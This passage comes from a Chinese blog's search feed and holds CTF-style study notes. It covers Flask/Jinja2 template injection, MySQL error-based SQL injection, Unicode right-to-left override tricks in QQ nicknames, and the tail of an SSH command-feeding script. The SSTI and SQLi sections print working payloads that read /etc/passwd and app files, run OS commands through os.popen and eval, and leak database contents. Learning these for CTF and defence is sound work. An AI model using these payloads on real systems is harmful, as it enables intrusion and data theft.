p.stdin.write(str(i) + &quot;\n&quot;)</span><br><span class="line">            p.stdin.flush()</span><br><span class="line">            time.sleep(0.2)</span><br><span class="line">    time.sleep(10)</span><br><span class="line">    p.stdin.write(&quot;exit\n&quot;)</span><br></pre></td></tr></table></figure><p>使用方法：</p><ul><li><p>运行环境 python2</p></li><li><p>需要在本目录新建一个commands.txt，commands.txt中每行为所需要执行的命令。</p></li><li><p>运行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python runssh.py &#123;目标ip&#125; &#123;执行命令个数&#125;</span><br></pre></td></tr></table></figure></li><li><p>执行后需要手动输入靶机密码。输入密码后程序自动继续运行。</p></li><li><p>已解决发包次数过多后断开的问题。（脚本中每执行一条命令后sleep 0.2秒）</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Dian </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 重定向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unicode的小把戏</title>
      <link href="2020/08/24/unicode%E7%9A%84%E5%B0%8F%E6%8A%8A%E6%88%8F/"/>
      <url>2020/08/24/unicode%E7%9A%84%E5%B0%8F%E6%8A%8A%E6%88%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h1><p>Unicode是计算机科学领域里的一项业界标准，它为每种语言中的每个字符设定了统一并且唯一的二进制编码。</p><p>下面来说一说一些unicode的trick <span id="more"></span></p><h2 id="QQ聊天小尾巴（仅限手机端）"><a href="#QQ聊天小尾巴（仅限手机端）" class="headerlink" title="QQ聊天小尾巴（仅限手机端）"></a>QQ聊天小尾巴（仅限手机端）</h2><p> 最近见到有些人的昵称后面加了个<code>喵~</code>，一开始还以为只是卖萌，后来才发现奇怪之处。在QQ界面可以看到QQ群消息的最近一条消息以及发出消息的人名，但是这些<code>喵~</code>却诡异地移动到了所发消息之后</p><p>看起来诡异，但是一猜就是unicode。</p><p>究竟是怎么回事？先看看他的群名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Void‮～喵‭</span><br></pre></td></tr></table></figure><p>转成unicode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;#86;&amp;#111;&amp;#105;&amp;#100;&amp;#8238;&amp;#65374;&amp;#21941;&amp;#8237;</span><br><span class="line">//V    o     i      d             ~       喵     </span><br></pre></td></tr></table></figure><p>搜一下这些unicode的含义，是正常字符的就不说了，重点是两个不可见字符。</p><p><img src="../../../../images/blog/200824/unicode1.png" class="lazyload" data-srcset="../../../../images/blog/200824/unicode1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="avatar"></p><p><img src="../../../../images/blog/200824/unicode2.png" class="lazyload" data-srcset="../../../../images/blog/200824/unicode2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="avatar"></p><p>这两个均为控制字符。其中，</p><p>RLO(<code>&amp;#8238;</code>)为从右至左优先，强制字符成为从右到左字符串。</p><p>LRO(<code>&amp;#8237;</code>)为从左至右优先，强制字符成为从左到右字符串。</p><p>这就是小尾巴的奥秘所在。当然，在读取文字编码时，读到<code>&amp;#8238;</code>时，强制从右到左，后面的文字会在<strong>本行</strong>从右向左显示。当读到<code>&amp;#8237;</code>时，又回归正常的从左向右，不会后面影响正常的文字。</p><p>当然，这种小尾巴的缺点在于，别人@你时，他所发的文字如果与<code>&amp;#8238;</code>在同一行，文字的内容可能会被翻转。但是仅对这一行有效。</p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unicode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask模板注入</title>
      <link href="2020/08/16/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>2020/08/16/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Flask模板注入（一）"><a href="#Flask模板注入（一）" class="headerlink" title="Flask模板注入（一）"></a>Flask模板注入（一）</h1><p>Flask中使用了Jinja2作为模板渲染引擎，Jinja2会将<code>{{}}</code>中包裹的内容当作变量解析替换。当服务器接受了用户的输入并将其作为模板的一部分，在渲染的过程中就可能渲染了用户插入的恶意内容，导致敏感信息泄露甚至代码执行。</p><h2 id="1、实现模板注入"><a href="#1、实现模板注入" class="headerlink" title="1、实现模板注入"></a>1、实现模板注入</h2><h3 id="1-1-基础知识"><a href="#1-1-基础知识" class="headerlink" title="1.1 基础知识"></a>1.1 基础知识</h3><h4 id="（1）-class-获取当前实例的类对象"><a href="#（1）-class-获取当前实例的类对象" class="headerlink" title="（1）_class_ 获取当前实例的类对象"></a>（1）_<em>class</em>_ 获取当前实例的类对象</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__</span><br><span class="line">&lt;type &#x27;str&#x27;&gt;       //空字符串是一个实例，对应的类是&lt;type &#x27;str&#x27;&gt; </span><br><span class="line">&gt;&gt;&gt; [].__class__</span><br><span class="line">&lt;type &#x27;list&#x27;&gt;      //空列表串是一个实例，对应的类是&lt;type &#x27;list&#x27;&gt;</span><br></pre></td></tr></table></figure><h4 id="（2）-base-获取当前类的一个继承类"><a href="#（2）-base-获取当前类的一个继承类" class="headerlink" title="（2）_base_ 获取当前类的一个继承类"></a>（2）_<em>base</em>_ 获取当前类的一个继承类</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__</span><br><span class="line">&lt;type &#x27;object&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__</span><br><span class="line">&lt;type &#x27;basestring&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__.__base__</span><br><span class="line">&lt;type &#x27;object&#x27;&gt;       //在python2.7中大部分类都继承了object类</span><br></pre></td></tr></table></figure><h4 id="（3）-mro-获取当前类的所有继承类"><a href="#（3）-mro-获取当前类的所有继承类" class="headerlink" title="（3）_mro_ 获取当前类的所有继承类"></a>（3）_<em>mro</em>_ 获取当前类的所有继承类</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__</span><br><span class="line">(&lt;type &#x27;str&#x27;&gt;, &lt;type &#x27;basestring&#x27;&gt;, &lt;type &#x27;object&#x27;&gt;)</span><br><span class="line">&gt;&gt;&gt; [].__class__.__mro__</span><br><span class="line">(&lt;type &#x27;list&#x27;&gt;, &lt;type &#x27;object&#x27;&gt;)</span><br></pre></td></tr></table></figure><h4 id="（4）-subclasses-获取当前类的所有继承类列表"><a href="#（4）-subclasses-获取当前类的所有继承类列表" class="headerlink" title="（4）_subclasses_() 获取当前类的所有继承类列表"></a>（4）_<em>subclasses</em>_() 获取当前类的所有继承类列表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[40]</span><br><span class="line">&lt;type &#x27;file&#x27;&gt;             //object的第40个子类</span><br><span class="line"></span><br><span class="line">//python2和python3的不同版本在object的子类中有较大不同</span><br></pre></td></tr></table></figure><h4 id="（5）-init-用于将对象实例化"><a href="#（5）-init-用于将对象实例化" class="headerlink" title="（5）_init_ 用于将对象实例化"></a>（5）_<em>init</em>_ 用于将对象实例化</h4><h4 id="（6）-dict-用于列出当前属性-函数的字典"><a href="#（6）-dict-用于列出当前属性-函数的字典" class="headerlink" title="（6）_dict_ 用于列出当前属性/函数的字典"></a>（6）_<em>dict</em>_ 用于列出当前属性/函数的字典</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; object.__subclasses__()[60].__init__.func_globals[&#x27;linecache&#x27;].os</span><br><span class="line">&lt;module &#x27;os&#x27; from &#x27;D:\python2.7\lib\os.pyc&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; object.__subclasses__()[60].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;]</span><br><span class="line">&lt;module &#x27;os&#x27; from &#x27;D:\python2.7\lib\os.pyc&#x27;&gt;</span><br><span class="line">\\这里感觉没有什么区别</span><br></pre></td></tr></table></figure><h4 id="（7）-getitem"><a href="#（7）-getitem" class="headerlink" title="（7） _getitem_"></a>（7） _<em>getitem</em>_</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__</span><br><span class="line">(&lt;type &#x27;str&#x27;&gt;, &lt;type &#x27;basestring&#x27;&gt;, &lt;type &#x27;object&#x27;&gt;)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__.__getitem__(1)</span><br><span class="line">&lt;type &#x27;basestring&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__.__getitem__(2)</span><br><span class="line">&lt;type &#x27;object&#x27;&gt;</span><br></pre></td></tr></table></figure><h4 id="（8）func-globals-返回一个包含函数全局变量的字典引用"><a href="#（8）func-globals-返回一个包含函数全局变量的字典引用" class="headerlink" title="（8）func_globals 返回一个包含函数全局变量的字典引用"></a>（8）func_globals 返回一个包含函数全局变量的字典引用</h4><h4 id="（9）-globals-对保存函数全局变量-定义函数的模块的全局名称空间-的字典的引用。"><a href="#（9）-globals-对保存函数全局变量-定义函数的模块的全局名称空间-的字典的引用。" class="headerlink" title="（9）_globals_  对保存函数全局变量(定义函数的模块的全局名称空间)的字典的引用。"></a>（9）_<em>globals</em>_  对保存函数全局变量(定义函数的模块的全局名称空间)的字典的引用。</h4><h3 id="1-2-实现恶意命令注入"><a href="#1-2-实现恶意命令注入" class="headerlink" title="1.2 实现恶意命令注入"></a>1.2 实现恶意命令注入</h3><h4 id="（1）文件读取"><a href="#（1）文件读取" class="headerlink" title="（1）文件读取"></a>（1）文件读取</h4><p>在object的所有子类中可以找到file类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; object.__subclasses__()[40]</span><br><span class="line">&lt;type &#x27;file&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[40]</span><br><span class="line">&lt;type &#x27;file&#x27;&gt;             //object的第40个子类一般为file</span><br></pre></td></tr></table></figure><p>故可以进行文件读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[40](&#x27;/etc/passwd&#x27;)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()</span><br></pre></td></tr></table></figure><h4 id="（2）命令执行-方法1"><a href="#（2）命令执行-方法1" class="headerlink" title="（2）命令执行-方法1"></a>（2）命令执行-方法1</h4><p>包含os模块的两个类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; object.__subclasses__()[72]</span><br><span class="line">&lt;class &#x27;site._Printer&#x27;&gt;   //这里环境该类位于object的第72个子类。但环境不同位置可能不同</span><br><span class="line">&lt;class &#x27;site.Quitter&#x27;&gt;    //这里环境该类位于object的第77个子类。但环境不同位置可能不同</span><br></pre></td></tr></table></figure><p>实现命令执行的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; object.__subclasses__()[72].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)</span><br><span class="line">&gt;&gt;&gt; object.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)</span><br><span class="line">//在注入时，直接使用system函数可能导致无回显，故可以使用popen函数</span><br><span class="line">&gt;&gt;&gt; object.__subclasses__()[72].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()</span><br><span class="line">&gt;&gt;&gt; object.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()</span><br></pre></td></tr></table></figure><h4 id="（3）命令执行-方法2"><a href="#（3）命令执行-方法2" class="headerlink" title="（3）命令执行-方法2"></a>（3）命令执行-方法2</h4><p>利用warnings.catch_warnings模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; object.__subclasses__()[60]</span><br><span class="line">&lt;class &#x27;warnings.catch_warnings&#x27;&gt;   //这里环境该类位于object的第60个子类。但环境不同位置可能不同</span><br></pre></td></tr></table></figure><p>实现命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; object.__subclasses__()[60].__init__.func_globals[&#x27;linecache&#x27;].os.popen(&#x27;whoami&#x27;).read()</span><br></pre></td></tr></table></figure><p>再补充一些payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; object.__subclasses__()[60].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;po&#x27;+&#x27;pen&#x27;](&#x27;whoami&#x27;).read()</span><br><span class="line">&#x27;laptop-91trpmfu\\admin\n&#x27;</span><br><span class="line">\\利用__dict__可以绕过某些黑名单</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; object.__subclasses__()[60].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)</span><br><span class="line">&#x27;laptop-91trpmfu\\admin\n&#x27;</span><br><span class="line">\\使用eval</span><br></pre></td></tr></table></figure><h4 id="（4）遍历找到catch-warnings的payload"><a href="#（4）遍历找到catch-warnings的payload" class="headerlink" title="（4）遍历找到catch_warnings的payload"></a>（4）遍历找到catch_warnings的payload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//执行命令</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">//读文件</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h2 id="2、附录"><a href="#2、附录" class="headerlink" title="2、附录"></a>2、附录</h2><h3 id="2-1-一些任意代码执行及读取文件函数"><a href="#2-1-一些任意代码执行及读取文件函数" class="headerlink" title="2.1 一些任意代码执行及读取文件函数"></a>2.1 一些任意代码执行及读取文件函数</h3><h4 id="（1）os执行系统命令"><a href="#（1）os执行系统命令" class="headerlink" title="（1）os执行系统命令"></a>（1）os执行系统命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.system(&#x27;ipconfig&#x27;)</span><br></pre></td></tr></table></figure><h4 id="（2）exec-任意代码执行"><a href="#（2）exec-任意代码执行" class="headerlink" title="（2）exec  任意代码执行"></a>（2）<strong>exec</strong>  任意代码执行</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(&#x27;__import__(&quot;os&quot;).system(&quot;ipconfig&quot;)&#x27;)</span><br></pre></td></tr></table></figure><h4 id="（3）eval-任意代码执行"><a href="#（3）eval-任意代码执行" class="headerlink" title="（3）eval  任意代码执行"></a>（3）eval  任意代码执行</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&#x27;__import__(&quot;os&quot;).system(&quot;ipconfig&quot;)&#x27;)</span><br></pre></td></tr></table></figure><h4 id="（4）timeit-本是检测性能的，也可以任意代码执行"><a href="#（4）timeit-本是检测性能的，也可以任意代码执行" class="headerlink" title="（4）timeit  本是检测性能的，也可以任意代码执行"></a>（4）<strong>timeit</strong>  本是检测性能的，也可以任意代码执行</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import timeit</span><br><span class="line">timeit.timeit(&quot;__import__(&#x27;os&#x27;).system(&#x27;ipconfig&#x27;)&quot;,number=1)</span><br></pre></td></tr></table></figure><h4 id="（5）platform"><a href="#（5）platform" class="headerlink" title="（5）platform"></a>（5）<strong>platform</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import platform</span><br><span class="line">platform.popen(&#x27;ipconfig&#x27;).read()</span><br></pre></td></tr></table></figure><h4 id="（6）subprocess"><a href="#（6）subprocess" class="headerlink" title="（6）subprocess"></a>（6）<strong>subprocess</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">subprocess.Popen(&#x27;ipconfig&#x27;, shell=True, stdout=subprocess.PIPE,stderr=subprocess.STDOUT).stdout.read()</span><br></pre></td></tr></table></figure><h4 id="（7）file"><a href="#（7）file" class="headerlink" title="（7）file"></a>（7）file</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(&#x27;/etc/passwd&#x27;).read()</span><br></pre></td></tr></table></figure><h4 id="（8）open"><a href="#（8）open" class="headerlink" title="（8）open"></a>（8）open</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(&#x27;/etc/passwd&#x27;).read()</span><br></pre></td></tr></table></figure><h4 id="（9）codecs"><a href="#（9）codecs" class="headerlink" title="（9）codecs"></a>（9）codecs</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import codecs</span><br><span class="line">codecs.open(&#x27;/etc/passwd&#x27;).read()</span><br></pre></td></tr></table></figure><h2 id="3、然而……这只是基础"><a href="#3、然而……这只是基础" class="headerlink" title="3、然而……这只是基础"></a>3、然而……这只是基础</h2><p>后续会相继补上：</p><p><a href="">flask模板注入（2）</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/tr1ple/p/9415641.html">python 模板注入</a></p><p><a href="https://www.cnblogs.com/NPFS/p/12764599.html">Flask模板注入</a></p><p><a href="https://blog.csdn.net/yh1013024906/article/details/84330056">FLASK模板注入（SSTI）</a></p><p><a href="https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">Flask/Jinja2 SSTI &amp;&amp; python 沙箱逃逸</a></p><p>还有一个基础而重要的  <a href="https://www.cnblogs.com/wancy86/p/6243725.html">python <em>_globals</em><em>,  _<em>file</em></em></a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> CTF-web </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>报错注入</title>
      <link href="2020/07/10/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
      <url>2020/07/10/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>之前都是做题中积累经验，感觉自己的基础薄弱。大部分时候都是看别人的WP才能做题。最近在看一本《CTF训练营》，补一补基础，做笔记。</p><h2 id="报错注入的条件"><a href="#报错注入的条件" class="headerlink" title="报错注入的条件"></a>报错注入的条件</h2><ul><li>可回显</li><li>回显有报错信息</li><li>过滤不严格（希望WAF不行）</li></ul><p>绕过是个麻烦事儿，这里暂且假设没有任何过滤。</p><h2 id="报错注入使用的函数"><a href="#报错注入使用的函数" class="headerlink" title="报错注入使用的函数"></a>报错注入使用的函数</h2><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value); </span><br><span class="line">第一个参数：XML_document，String格式，为XML文档对象的名称</span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串) </span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据 </span><br></pre></td></tr></table></figure><p>updatexml()的第二个参数为Xpath格式的字符串，当其不属于Xpath语法时就会报错，<strong>报错内容显示</strong>出该参数不符合Xpath语法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT updatexml(1, concat(Ox7e,(SELECT version()),0x7e),1);</span><br><span class="line">ERROR 1105 (HY00O): XPATH syntax error: &#x27; -5.6.26~ &#x27;            #成功爆出数据库版本</span><br></pre></td></tr></table></figure><p>于是，通过改变updatexml()的第二个参数，可以执行SQL语句查数据库、查表、等等。</p><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EXTRACTVALUE (XML_document, XPath_string); </span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称</span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串)</span><br></pre></td></tr></table></figure><p>extractvalue()从XML中返回包含查询值的字符串。通过extractvalue()实现报错注入的原理与updatexml()十分类似。都是通过参数不符合Xpath的语法，实现报错注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT 1,2 and extractvalue(1,concat(Ox7e,(SELECT version()),0x7e));</span><br><span class="line">ERROR 1105 (HY00O): XPATH syntax error: &#x27; -5.6.26~ &#x27;           #成功爆出数据库版本</span><br></pre></td></tr></table></figure><h3 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h3><p>floor()函数只有一个参数。</p><p>floor函数的作用是返回小于等于该值的最大整数，即向下取整，只保留整数部分。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_ schema.tables limit 0,1),floor(rand(0)*2))x from information_ schema.tables group by x)a)%23</span><br><span class="line"></span><br><span class="line">#来源于《CTF训练营》</span><br></pre></td></tr></table></figure><p>可爆出数据库版本。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h3><p>exp()函数只有一个参数。</p><p>此函数返回e(自然对数的底)指数X的幂值。但是当传递的参数大于709时，就会发生溢出错误。</p><p>正确执行函数返回0，对0按位取反可以得到很大的数“18446744073709551615”，故可以构造注入语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; an exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x)); </span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/weixin_41594045/article/details/83547103">SQL注入 | exp()函数报错</a></p><p>《CTF训练营》</p>]]></content>
      
      
      <categories>
          
          <category> CTF-web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-web </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
